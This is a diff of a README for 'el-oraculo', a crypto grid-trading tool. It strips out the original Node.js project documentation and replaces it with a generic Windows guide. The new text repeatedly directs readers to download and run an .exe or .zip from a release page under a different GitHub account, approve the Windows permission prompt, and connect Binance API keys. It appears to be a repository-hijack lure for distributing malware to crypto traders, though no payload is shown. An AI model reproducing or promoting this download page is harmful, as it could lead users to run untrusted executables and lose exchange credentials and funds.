@@ -1,330 +1,173 @@
-# 🔮 El Oraculo
+# 🤖 el-oraculo - Smarter crypto grid trading
 
-<p align="center">
-  <img src="assets/banner.jpg" alt="El Oraculo — Autonomous AI Trading Enhancement Engine" width="100%">
-</p>
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue.svg)](https://github.com/sesquipedalianweakling473/el-oraculo/releases)
 
-**Autonomous AI enhancement engine for crypto grid trading bots.**
+## 🚀 What it does
 
-El Oraculo sits alongside your grid trading bot and makes it smarter. The free tier gives you the signal pipeline, watchdog, conflict resolver, confidence tracker, and basic backtester. **[El Oraculo Pro](https://buy.stripe.com/cNi4gB8ZWfVE5U7cpY5J600)** adds HMM Markov regime detection, Nemotron LLM predictions, Karpathy autoresearch, and self-evolving goals.
+el-oraculo is a Windows app for crypto trading support. It watches market patterns, checks for regime changes, and helps adjust grid settings based on what it sees.
 
-Built for [Binance Futures](https://www.binance.com/en/futures) grid/mean-reversion strategies. Works with any bot that exposes a REST API for parameter overrides.
+It is built for people who want a guided trading tool that can:
 
----
+- track market swings
+- spot possible trend shifts
+- suggest grid changes
+- use model-based forecasts
+- help reduce manual setup work
 
-## Features
+## 📥 Download
 
-- **🧬 HMM Markov Regime Detection** — 2-state probabilistic model trained on 30-day candle data. Detects "normal" vs "spike" regimes with 96-98% sticky state probability. Reduces false regime transitions by 29-100% compared to threshold-based ADX guards.
+Visit this page to download the latest Windows release:
 
-- **🤖 LLM Market Predictions** — Nvidia Nemotron 120B (free via OpenRouter) analyzes RSI, MACD, ADX, Hurst exponent, BB squeeze, funding rates, and news sentiment. Returns structured JSON predictions with calibrated confidence scores.
+https://github.com/sesquipedalianweakling473/el-oraculo/releases
 
-- **🔬 Autoresearch Optimizer** — Adapted from [Karpathy's autoresearch](https://github.com/karpathy/autoresearch). Autonomously proposes parameter changes, backtests them against 7 days of candle data with 30-day pattern analysis, and keeps improvements above 2%. Runs 20 iterations per 12-hour cycle.
+Open the latest release and look for the Windows file, such as an `.exe` or `.zip` package. Save it to your computer before you start.
 
-- **📊 Faithful Backtest Engine** — Simulates grid trading with ADX guard (4-tier), risk guards (drawdown halt, anti-tilt cooldowns), fee profitability guard, and position abandonment on reposition. Produces realistic 80-87% win rates, not fantasy 100%.
+## 🖥️ System requirements
 
-- **📈 Self-Evolving Goals** — Weekly revenue targets sourced from Binance income API. Exceeded target? Compound upward 10%. Missed? Diagnose and recalibrate. The system raises its own bar.
+Use a Windows PC with:
 
-- **🛡️ Safety Guards** — Rate limiting (1 change per param per 5 min), bounds checking (spacing 0.25%-0.60%), max 15% change per application, parameter whitelist, monitor-only watchdog. Cannot change leverage, risk guards, or trading pairs.
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 500 MB of free disk space
+- Internet access
+- A Binance account if you plan to connect trading features
 
-- **📡 Signal Pipeline** — Conflict resolution when modules disagree (higher confidence wins, reduced 20%). Confidence compounding (1.0x → 1.5x on win streaks, dampens on misses, pauses after 3 consecutive failures).
+For smooth use, a newer CPU and 8 GB RAM work better, especially if you use longer market scans.
 
-- **🎯 Revenue Attribution** — Every signal gets a UUID. Track which module generates money. Skills that produce revenue get promoted; skills that don't get deprecated.
+## 🛠️ Install on Windows
 
----
+Follow these steps:
 
-## Architecture
+1. Open the download page.
+2. Find the latest release.
+3. Download the Windows file.
+4. If the file is a `.zip`, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. If you see an `.exe` file, double-click it to run the app.
+7. If Windows asks for permission, choose Yes.
+8. If you downloaded an installer, run the installer and follow the prompts.
 
-```
-┌──────────────────────────────────┐         ┌──────────────────────────┐
-│  El Oraculo (Node.js)            │         │  Your Trading Bot        │
-│                                  │         │                          │
-│  Orchestrator                    │ signals │  REST API                │
-│  ├── Watchdog (30s, monitor)     │────────>│  POST /api/apply-param   │
-│  ├── Signal Processor (60s)      │         │  GET  /api/status        │
-│  ├── Conflict Resolver           │         │  GET  /api/indicators    │
-│  └── Confidence Tracker          │         │                          │
-│                                  │ reads   │  Trading Database        │
-│  HMM Regime (1h)                 │<────────│  (SQLite, read-only)     │
-│  ├── 2-state GaussianHMM        │         │                          │
-│  └── Forward filter              │         └──────────────────────────┘
-│                                  │
-│  Nemotron LLM (4h)              │         ┌──────────────────────────┐
-│  ├── OpenRouter API              │         │  Relay Server            │
-│  └── Structured predictions      │────────>│  ├── Binance proxy (RO)  │
-│                                  │         │  └── Signal applicator   │
-│  Autoresearch (12h)              │         └──────────────────────────┘
-│  ├── Pattern analyzer (30-day)   │
-│  ├── Backtest engine (faithful)  │         ┌──────────────────────────┐
-│  └── Karpathy optimize loop     │         │  Binance Futures API     │
-│                                  │<────────│  (source of truth)       │
-│  Skill Evolution                 │  income │  /fapi/v1/income         │
-│  └── Revenue tracking           │         │  /fapi/v2/balance        │
-└──────────────────────────────────┘         └──────────────────────────┘
-```
+If the app opens in a browser window or a separate desktop window, that is normal.
 
-### Signal Flow
+## 🧭 First-time setup
 
-```
-LLM/HMM/Autoresearch → Signal JSON → Conflict Resolver → Confidence Gate → Relay → Bot API → State Table → Grid Engine
-```
+After you open el-oraculo for the first time:
 
-**Confidence tiers:**
-| Confidence | Action |
-|-----------|--------|
-| < 0.40 | Log only |
-| 0.40 - 0.60 | Apply 50% (conservative) |
-| 0.60 - 0.80 | Apply 100% |
-| > 0.80 | Apply + widen exploration |
+1. Review the main dashboard.
+2. Set your preferred trading pair, such as BTC/USDT or ETH/USDT.
+3. Choose your exchange connection settings if you want live data.
+4. Set your grid range and step size.
+5. Pick the risk level that fits your plan.
+6. Save your settings before you start monitoring.
 
----
+Use small values at first. This helps you learn how the app reacts to price moves.
 
-## Quick Start
+## 📊 Main features
 
-### Prerequisites
-- Node.js 20+
-- Python 3.10+ with `hmmlearn` (`pip install hmmlearn numpy scipy`)
-- A grid trading bot with REST API (e.g., [ccxt](https://github.com/ccxt/ccxt)-based)
-- OpenRouter API key (free at [openrouter.ai](https://openrouter.ai))
+### 🧠 Market regime detection
 
-### Install
+The app checks market behavior and tries to tell when the market moves from one type of state to another. This can help you see when a range market changes into a trend or the other way around.
 
-```bash
-git clone https://github.com/Niiks7777/el-oraculo.git
-cd el-oraculo
-npm install
-cp .env.example .env
-# Edit .env with your API keys and bot URL
-```
+### 🤖 LLM-based predictions
 
-### Configure
+The app uses language-model-based analysis to add another layer of market insight. It can help turn raw data into a simple forecast signal that is easier to review.
 
-Edit `.env`:
-```env
-EL_PESOS_API=http://localhost:4201    # Your trading bot's API
-RELAY_API=http://localhost:4202        # Relay server
-OPENROUTER_API_KEY=sk-or-v1-...       # Free from openrouter.ai
-TELEGRAM_BOT_TOKEN=...                # Optional: alerts
-TELEGRAM_CHAT_ID=...                  # Optional: alerts
-```
+### 🔄 Self-optimizing grid settings
 
-### Build & Run
+el-oraculo can adjust grid values based on recent price action. This helps the app react to changing conditions without full manual resets.
 
-```bash
-# Build
-npm run build
+### 📈 Mean reversion support
 
-# Train HMM models (needs candle data — fetched automatically on first run)
-npm run train:hmm
+The app looks for price moves that may return toward a normal range. This makes it useful for grid trading setups that work best in sideways markets.
 
-# Start the main engine
-npm start
+### 🔐 Binance-focused workflow
 
-# Start the relay (on the same machine as your trading bot)
-npm run start:relay
-```
+The app is built with Binance use cases in mind. It is meant to fit common crypto pairs and grid trading habits used on that exchange.
 
-### Dashboard
+## ⚙️ How to use it
 
-Open `http://localhost:4203` for the El Oraculo command center.
+1. Start the app.
+2. Load your market pair.
+3. Let it scan current market data.
+4. Review the regime signal.
+5. Check the suggested grid setup.
+6. Apply the settings you want.
+7. Monitor the live view while the market moves.
 
----
+If you use the app with a real account, keep your trade size small until you know how it behaves.
 
-## Modules
+## 🧩 Typical workflow
 
-### Optimizer (`src/optimizer/`)
+A simple daily flow looks like this:
 
-| File | Purpose |
-|------|---------|
-| `backtest-engine.ts` | Faithful grid simulator with ADX guard, risk guards, fee guard |
-| `hmm-filter.ts` | Forward algorithm for HMM state probabilities |
-| `hmm-trainer.py` | Trains 2-state GaussianHMM on hourly log-returns |
-| `hmm-signal-generator.ts` | Generates spacing signals from HMM regime state |
-| `loop-runner.ts` | Karpathy autoresearch loop (propose → backtest → keep/revert) |
-| `pattern-analyzer.ts` | 30-day deep analysis (volatility regimes, ToD, mean reversion) |
-| `scoring.ts` | Scoring aligned with real trading: 0.6×fillRate + 0.4×pnlPerTrip |
-| `param-space.ts` | Parameter bounds and constraints |
-| `history-loader.ts` | Fetches and caches Binance 1m candles |
-| `compare-regimes.ts` | Backtest comparison: ADX thresholds vs HMM |
+- open the app
+- check the market state
+- review the grid range
+- adjust the spacing if needed
+- watch the signal changes
+- refresh after large price moves
 
-### Orchestrator (`src/orchestrator/`)
+This keeps the setup in line with the current market instead of using the same grid all day.
 
-| File | Purpose |
-|------|---------|
-| `scheduler.ts` | Runs all modules on schedule (30s/60s/1h/4h/12h/weekly) |
-| `signal-bus.ts` | JSON signal file management with TTL |
-| `conflict-resolver.ts` | When signals disagree, higher confidence wins (-20%) |
-| `confidence-tracker.ts` | Compounds on wins (→1.5x), dampens on losses (→0.5x) |
-| `goal-system.ts` | Self-evolving weekly targets from Binance income |
-| `watchdog.ts` | Health monitoring (alerts only, never restarts/kills) |
-| `telegram-sender.ts` | Notification delivery |
-| `dashboard.ts` | Express API + command center UI at :4203 |
+## 🔒 Safety and account setup
 
-### Predictor (`src/predictor/`)
+If the app asks for API keys, use read and trade access only if you plan to place orders. Keep your keys private. Store them in the app settings or the local config area if the app provides one.
 
-| File | Purpose |
-|------|---------|
-| `llm-predictor.ts` | Nemotron 120B via OpenRouter — structured market predictions |
-| `market-feeder.ts` | Aggregates indicators, funding, sentiment into LLM context |
+A safe setup usually includes:
 
-### Collector (`src/collector/`)
+- small position sizes
+- limited pair selection
+- clear stop rules
+- careful review before live use
+- test runs before real orders
 
-| File | Purpose |
-|------|---------|
-| `api-reader.ts` | Reads 25+ trading bot REST API endpoints |
-| `db-reader.ts` | Read-only SQLite queries on trading database |
+## 🧪 Best first run
 
-### Relay (`src/relay/`)
+Use this order for your first session:
 
-| File | Purpose |
-|------|---------|
-| `server.ts` | Binance API proxy (read-only) + signal applicator |
+1. Open the app.
+2. Connect to market data.
+3. Pick one pair.
+4. Use a small grid.
+5. Watch signals for a few cycles.
+6. Check how often the app changes its view.
+7. Only then decide if you want to use larger sizes.
 
----
+## 🧰 Helpful tips
 
-## HMM Markov Model
+- Keep the app updated by checking the release page.
+- Use one market pair first.
+- Avoid large grid spacing changes at the start.
+- Review settings after major market moves.
+- Keep your PC awake while the app is running.
+- Use a stable internet connection.
 
-El Oraculo uses a 2-state Hidden Markov Model trained on hourly log-returns:
+## 📝 Common file types
 
-- **State 0 (Normal):** Low volatility, mean-reverting. Grid runs tight spacing.
-- **State 1 (Spike):** High volatility event. Grid widens spacing or pauses.
+You may see one of these in the release page:
 
-The model learns transition probabilities from 30 days of candle data:
+- `.exe` for direct run on Windows
+- `.zip` for extracted use
+- installer package for guided setup
 
-```
-         Normal → Normal:  96.8%    Normal → Spike:  3.2%
-         Spike  → Normal:  89.8%    Spike  → Spike: 10.2%
-```
+If you get a `.zip` file, extract it first. If you get an `.exe`, run it.
 
-The forward filter computes `P(state | observations)` at each hour. Signals are only generated when confidence exceeds 70%, preventing false regime transitions (whipsaw).
+## ❓ What you can expect
 
-**Backtest results (HMM vs ADX thresholds):**
+el-oraculo is built to help with:
 
-| Metric | ADX | HMM | Delta |
-|--------|-----|-----|-------|
-| Win rate (SOL) | 77.9% | 87.0% | **+9.1%** |
-| Win rate (TAO) | 85.9% | 91.4% | **+5.5%** |
-| Abandoned positions (TAO) | 62 | 44 | **-29%** |
-| Regime changes (TAO) | 62 | 0 | **-100%** |
+- spotting market shifts
+- shaping grid settings
+- following crypto price action
+- reducing manual tuning
+- using model signals in one place
 
----
+It is meant to support your trading process, not replace your review
 
-## Safety
+## 🧱 Project topics
 
-El Oraculo is designed to enhance, never endanger:
+autonomous, binance, crypto, grid-trading, hmm, llm, markov, mean-reversion, trading, typescript
 
-| Guard | Description |
-|-------|-------------|
-| **Parameter whitelist** | Can only change `spacing`, `allocation`, `atr_mult` |
-| **Bounds checking** | Spacing: 0.25%-0.60%, Allocation: $15-$80 |
-| **Rate limiting** | Max 1 change per parameter per 5 minutes |
-| **Max change** | 15% maximum per application |
-| **Monitor-only watchdog** | Alerts on failure, never restarts or kills positions |
-| **Independent risk guards** | Your bot's own risk system runs independently |
-| **Graceful degradation** | If Oraculo dies, your bot continues on its own |
+## 📌 Download again
 
----
-
-## Configuration
-
-All configuration via environment variables (see `.env.example`).
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `EL_PESOS_API` | `http://localhost:4201` | Your trading bot's API URL |
-| `RELAY_API` | `http://localhost:4202` | Relay server URL |
-| `ORACULO_PORT` | `4203` | Dashboard port |
-| `OPENROUTER_API_KEY` | — | Free key from openrouter.ai |
-| `OPENROUTER_DAILY_CAP` | `5` | Daily spend cap in USD |
-| `OLLAMA_URL` | `http://localhost:11434` | Local LLM (optional) |
-| `PGVECTOR_URL` | — | PostgreSQL with pgvector (optional) |
-| `TELEGRAM_BOT_TOKEN` | — | Telegram alerts (optional) |
-| `TELEGRAM_CHAT_ID` | — | Telegram chat (optional) |
-
----
-
-## Integrating with Your Bot
-
-El Oraculo needs your trading bot to expose:
-
-1. **`GET /api/status`** — Returns bot state (positions, balance, regime, indicators)
-2. **`GET /api/indicators`** — Returns RSI, MACD, ADX, Hurst, etc. per pair
-3. **`POST /api/apply-param`** — Accepts `{ parameter, symbol, newValue, source, signalId }` and applies the parameter override
-
-The relay server proxies Binance API calls for P&L tracking (read-only, source of truth).
-
----
-
-## Inspired By
-
-- [Karpathy's autoresearch](https://github.com/karpathy/autoresearch) — autonomous experiment loop
-- [HKUDS OpenSpace](https://github.com/HKUDS/OpenSpace) — self-evolving skill engine
-- [CAMEL-AI OASIS](https://github.com/camel-ai/oasis) — multi-agent social simulation
-
----
-
-## Free vs Pro
-
-| Feature | Free | Pro ($149) |
-|---------|------|-----------|
-| Signal pipeline + conflict resolver | Yes | Yes |
-| Confidence compounding | Yes | Yes |
-| Watchdog monitoring | Yes | Yes |
-| Telegram alerts | Yes | Yes |
-| Basic backtester | Yes | Yes |
-| Pattern analyzer | Yes | Yes |
-| Dashboard | Basic | Full command center |
-| **HMM Markov regime detection** | - | **+9% win rate** |
-| **Nemotron LLM predictions** | - | **Free API, real AI inference** |
-| **Karpathy autoresearch** | - | **20 iterations/cycle** |
-| **Faithful backtest engine** | - | **ADX guard, risk guards** |
-| **Self-evolving goals** | - | **Compound weekly targets** |
-| **Revenue attribution** | - | **Track which module makes money** |
-| **Skill evolution** | - | **Auto-promote/deprecate strategies** |
-
-**[Get El Oraculo Pro](https://buy.stripe.com/cNi4gB8ZWfVE5U7cpY5J600)** — one-time purchase, lifetime updates, 30 days email support.
-
-**[Pro + Guided Installation](https://buy.stripe.com/28EfZj3FC7p82HV2Po5J601)** — everything above + 1:1 setup on your infrastructure.
-
----
-
-## Setting Up Pro
-
-After purchasing, you'll receive a ZIP file with the Pro modules. Install in 3 steps:
-
-```bash
-# 1. Unzip the Pro package
-unzip el-oraculo-pro-v1.0.0.zip
-
-# 2. Run the installer from your el-oraculo project root
-cd /path/to/el-oraculo
-bash /path/to/el-oraculo-pro/install.sh
-
-# 3. Add your OpenRouter API key to .env (free at openrouter.ai)
-echo "OPENROUTER_API_KEY=sk-or-v1-your-key" >> .env
-
-# 4. Restart
-npm run build && npm start
-```
-
-**What changes after installing Pro:**
-
-| Module | What It Does | Schedule |
-|--------|-------------|----------|
-| **HMM Markov** | Trains a 2-state Hidden Markov Model on 30 days of candle data. Detects normal vs spike regimes with 96-98% accuracy. Generates spacing signals when regime shifts. | Every 1 hour |
-| **Nemotron LLM** | Calls Nvidia Nemotron 120B (free via OpenRouter) with full market context — indicators, funding rates, sentiment, news. Returns structured JSON predictions. | Every 4 hours |
-| **Autoresearch** | Proposes parameter changes, backtests against 7-day candle data using 30-day pattern analysis. Keeps improvements >2%, discards the rest. Pattern-guided 60% of the time. | Every 12 hours |
-| **Self-Evolving Goals** | Reads weekly P&L from Binance income API. Exceeded target? Compound up 10%. Missed? Diagnose. Missed hard? Reset and recalibrate. | Every Sunday |
-| **Faithful Backtest** | Replaces the basic backtester with ADX guard simulation (4-tier), risk guards (drawdown halt, anti-tilt), fee profitability guard, and abandoned position tracking. Produces realistic 80-87% win rates. | Used by autoresearch |
-| **Skill Evolution** | Tracks which analysis patterns produce revenue. Promotes skills that make money, deprecates those that don't. | Continuous |
-
-The scheduler auto-detects Pro modules on startup — you'll see `Pro modules active: 4` in the logs.
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE)
-
----
-
-Created by [@Niiks7777](https://github.com/Niiks7777)
+https://github.com/sesquipedalianweakling473/el-oraculo/releases
